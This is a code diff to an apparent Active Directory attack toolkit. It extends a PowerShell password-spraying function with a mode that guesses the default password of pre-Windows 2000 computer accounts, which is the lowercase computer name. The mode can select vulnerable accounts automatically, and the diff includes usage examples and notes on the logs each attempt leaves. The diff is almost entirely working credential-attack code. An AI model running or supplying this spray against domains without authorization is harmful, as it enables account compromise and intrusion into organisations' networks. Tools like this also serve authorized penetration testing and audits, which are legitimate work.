@@ -87,7 +87,28 @@ function Invoke-PasswordSpray {
     first attempt. WARNING: like a password list, every hash is one more failed logon
     per account.
 
-    Exactly one of -Password, -PasswordList, -NTHash and -NTHashList is required.
+    Exactly one of -Password, -PasswordList, -NTHash, -NTHashList and -ComputerDefault is
+    required.
+
+.PARAMETER ComputerDefault
+    Tests computer accounts for the default password of a pre-Windows 2000 computer: the
+    computer name in lowercase, without "$", cut to 14 characters - what ADUC with
+    "Assign this computer account as a pre-Windows 2000 computer" and "net computer /add"
+    set. The password is derived per account, so there is no list to give, and every
+    account gets exactly one attempt.
+
+    With -Auto the accounts are the ones Get-ComputerInitialPassword reports as
+    "Unchanged" (in use or never used) - the same selection, Get-ComputerInitialPasswordCandidate
+    - with the same lockout protection as for users. With -UserList the names given; a
+    missing "$" is added.
+
+    The accounts that never had a password set ("dsadd computer") are not tested: they have
+    no Kerberos keys, and the empty password they accept works over NTLM only, which this
+    spray does not use. Auto mode names their count.
+
+    Side effects, measured in a lab: a hit issues a TGT and sets logonCount, lastLogon and
+    lastLogonTimestamp - the account then reads "in use" in Get-ComputerInitialPassword; a
+    miss raises badPwdCount and logs event 4771.
 
 .PARAMETER Domain
     Target domain FQDN (optional, uses current domain from session if not specified)
@@ -151,7 +172,7 @@ function Invoke-PasswordSpray {
         - asmith: 5/5 bad attempts (only 0 remaining)
         - bwilson: 4/5 bad attempts (only 1 remaining)
 
-    [+] Safe to test: 520 users (skipped: 3)
+    [+] Safe to test: 520 enabled users (skipped: 3)
 
 .EXAMPLE
     # Password spray with delay for stealth
@@ -170,6 +191,15 @@ function Invoke-PasswordSpray {
 .EXAMPLE
     # Several NT hashes from a file (one per line)
     Invoke-PasswordSpray -UserList users.txt -NTHashList hashes.txt -Domain "contoso.com" -Delay 1000
+
+.EXAMPLE
+    # Computer accounts created in advance, tested for their default password
+    Connect-adPEAS -Domain "contoso.com" -UseWindowsAuth
+    Invoke-PasswordSpray -Auto -ComputerDefault
+
+.EXAMPLE
+    # Named computer accounts only ("$" is added where missing)
+    Invoke-PasswordSpray -UserList 'WS-STAGED01','WS-STAGED02$' -ComputerDefault -Domain "contoso.com"
 
 .EXAMPLE
     # Spray and export results
@@ -244,7 +274,10 @@ function Invoke-PasswordSpray {
         [switch]$Force,
 
         [Parameter(Mandatory=$false)]
-        [string]$OutputFile
+        [string]$OutputFile,
+
+        [Parameter(Mandatory=$false)]
+        [switch]$ComputerDefault
     )
 
     begin {
@@ -259,26 +292,30 @@ function Invoke-PasswordSpray {
         # sprayed the same way, one AS-REQ per account and secret; they differ only in the
         # key Invoke-KerberosAuth builds the pre-authentication with.
         $secretSources = @()
-        if ($Password)     { $secretSources += '-Password' }
-        if ($PasswordList) { $secretSources += '-PasswordList' }
-        if ($NTHash)       { $secretSources += '-NTHash' }
-        if ($NTHashList)   { $secretSources += '-NTHashList' }
+        if ($Password)        { $secretSources += '-Password' }
+        if ($PasswordList)    { $secretSources += '-PasswordList' }
+        if ($NTHash)          { $secretSources += '-NTHash' }
+        if ($NTHashList)      { $secretSources += '-NTHashList' }
+        if ($ComputerDefault) { $secretSources += '-ComputerDefault' }
 
         if ($secretSources.Count -eq 0) {
-            Write-Error "You must specify one of -Password, -PasswordList, -NTHash or -NTHashList"
+            Write-Error "You must specify one of -Password, -PasswordList, -NTHash, -NTHashList or -ComputerDefault"
             $abortRun = $true; return
         }
 
         if ($secretSources.Count -gt 1) {
-            Write-Error "Specify only one of -Password, -PasswordList, -NTHash or -NTHashList - got $($secretSources -join ', ')."
+            Write-Error "Specify only one of -Password, -PasswordList, -NTHash, -NTHashList or -ComputerDefault - got $($secretSources -join ', ')."
             $abortRun = $true; return
         }
 
         # The parameter name the secret is handed to Invoke-KerberosAuth under, and the
-        # words the console uses for it.
+        # words the console uses for it. A computer default password is a password, derived
+        # per account (process{}).
         $secretKind = if ($NTHash -or $NTHashList) { 'NTHash' } else { 'Password' }
         $secretLabel       = if ($secretKind -eq 'NTHash') { 'NT-Hash' }   else { 'password' }
         $secretLabelPlural = if ($secretKind -eq 'NTHash') { 'NT-Hashes' } else { 'passwords' }
+        # What auto mode tests, in the words of its lockout lines.
+        $accountNoun = if ($ComputerDefault) { 'candidate computer accounts' } else { 'enabled users' }
 
         # Build connection parameters (for Ensure-LDAPConnection and Get-Domain* calls)
         $connectionParams = @{}
@@ -365,17 +402,37 @@ function Invoke-PasswordSpray {
             }
             Write-Host ""
 
-            Write-Host "[*] Fetching all enabled users from domain..." -ForegroundColor Cyan
+            if ($ComputerDefault) {
+                # The accounts Get-ComputerInitialPassword reports, by the same selection.
+                # Only the "Unchanged" ones can have the default password; the ones that never
+                # had one set have no Kerberos keys, and their empty password works over NTLM
+                # only, which this spray does not use.
+                Write-Host "[*] Fetching computer accounts that still carry their creation password..." -ForegroundColor Cyan
+                $candidates = @(Get-ComputerInitialPasswordCandidate @connectionParams)
+                $noPasswordCount = @($candidates | Where-Object { $_.passwordSinceCreation -eq 'Never set - empty password' }).Count
+                $enabledUsers = @($candidates | Where-Object { $_.passwordSinceCreation -like 'Unchanged*' })
 
-            # Get all enabled users with badPwdCount attribute
-            $enabledUsers = Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" @connectionParams
+                if ($noPasswordCount -gt 0) {
+                    Write-Host "[*] $noPasswordCount computer account(s) never had a password set - not tested (no Kerberos keys; see Get-ComputerInitialPassword)" -ForegroundColor Yellow
+                }
+                if ($enabledUsers.Count -eq 0) {
+                    Write-Error "No computer account whose password may still be the default"
+                    $abortRun = $true; return
+                }
+                Write-Host "[+] Found $($enabledUsers.Count) computer account(s) whose password dates from their creation" -ForegroundColor Green
+            } else {
+                Write-Host "[*] Fetching all enabled users from domain..." -ForegroundColor Cyan
 
-            if (-not $enabledUsers) {
-                Write-Error "No enabled users found in domain"
-                $abortRun = $true; return
+                # Get all enabled users with badPwdCount attribute
+                $enabledUsers = Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" @connectionParams
+
+                if (-not $enabledUsers) {
+                    Write-Error "No enabled users found in domain"
+                    $abortRun = $true; return
+                }
+
+                Write-Host "[+] Found $($enabledUsers.Count) enabled users" -ForegroundColor Green
             }
-
-            Write-Host "[+] Found $($enabledUsers.Count) enabled users" -ForegroundColor Green
 
             # Filter users based on lockout threshold
             $skippedUsers = @()
@@ -421,7 +478,7 @@ function Invoke-PasswordSpray {
                     $abortRun = $true; return
                 }
 
-                Write-Host "[+] Safe to test: $($usernames.Count) users (skipped: $($skippedUsers.Count))" -ForegroundColor Green
+                Write-Host "[+] Safe to test: $($usernames.Count) $accountNoun (skipped: $($skippedUsers.Count))" -ForegroundColor Green
                 Write-Host ""
 
             } else {
@@ -430,9 +487,9 @@ function Invoke-PasswordSpray {
                 # (spraying cannot lock anything), or the policy could not be read and the
                 # run continues only because -Force was given.
                 if ($lockoutPolicyRead) {
-                    Write-Host "[*] Domain has no lockout policy configured - testing all enabled users" -ForegroundColor Yellow
+                    Write-Host "[*] Domain has no lockout policy configured - testing all $accountNoun" -ForegroundColor Yellow
                 } else {
-                    Write-Host "[!] Lockout policy unknown - testing all enabled users WITHOUT lockout protection" -ForegroundColor Red
+                    Write-Host "[!] Lockout policy unknown - testing all $accountNoun WITHOUT lockout protection" -ForegroundColor Red
                 }
                 Write-Host ""
                 $usernames = $enabledUsers | ForEach-Object { $_.sAMAccountName }
@@ -460,9 +517,13 @@ function Invoke-PasswordSpray {
             $usernames = @($UserList)
         }
 
-        # Load the secrets - passwords or NT hashes
+        # Load the secrets - passwords or NT hashes. -ComputerDefault has one per account,
+        # derived in process{}; the single entry here only stands for it, so the loop there
+        # runs once.
         $secrets = @()
-        if ($Password) {
+        if ($ComputerDefault) {
+            $secrets = @('(computer name in lowercase)')
+        } elseif ($Password) {
             $secrets = @($Password)
         } elseif ($NTHash) {
             $secrets = @($NTHash)
@@ -507,6 +568,12 @@ function Invoke-PasswordSpray {
             elseif ($accountName -match '@') { $accountName.Split('@')[0] }
             else { $accountName }
         } | Where-Object { $_ })
+
+        # A computer account's sAMAccountName ends in "$"; a name given without it is meant
+        # with it - "WS-STAGED01" is the account WS-STAGED01$.
+        if ($ComputerDefault) {
+            $usernames = @($usernames | ForEach-Object { if ($_.EndsWith('$')) { $_ } else { "$_`$" } })
+        }
 
         if ($usernames.Count -eq 0) {
             Write-Error "No usernames to test"
@@ -602,6 +669,8 @@ function Invoke-PasswordSpray {
         Write-Host $usersLine
         if ($secretKind -eq 'NTHash') {
             Write-Host "    NT-Hashes:       $($secrets.Count) (RC4-HMAC)"
+        } elseif ($ComputerDefault) {
+            Write-Host "    Passwords:       computer name in lowercase, one per account"
         } else {
             Write-Host "    Passwords:       $($secrets.Count)"
         }
@@ -663,6 +732,11 @@ function Invoke-PasswordSpray {
 
                 # Already the bare account name - normalized in begin{}
                 $cleanUsername = $username
+
+                # -ComputerDefault: the password is the account's own - its name in
+                # lowercase. Set here, so the attempt, the hit, the output file and the
+                # verbose lines all carry the one that was tried.
+                if ($ComputerDefault) { $secret = Get-ComputerDefaultPassword -SamAccountName $username }
 
                 # Progress indicator every 50 attempts
                 if ($attemptNum % 50 -eq 0) {
@@ -747,7 +821,7 @@ function Invoke-PasswordSpray {
                             Password  = $secret
                             Domain    = $targetDomain
                             Timestamp = $timestamp
-                            Method    = "Kerberos Pre-Auth"
+                            Method    = $(if ($ComputerDefault) { "Kerberos Pre-Auth (computer default password)" } else { "Kerberos Pre-Auth" })
                         }
                     }
                     $successfulCreds += $credInfo
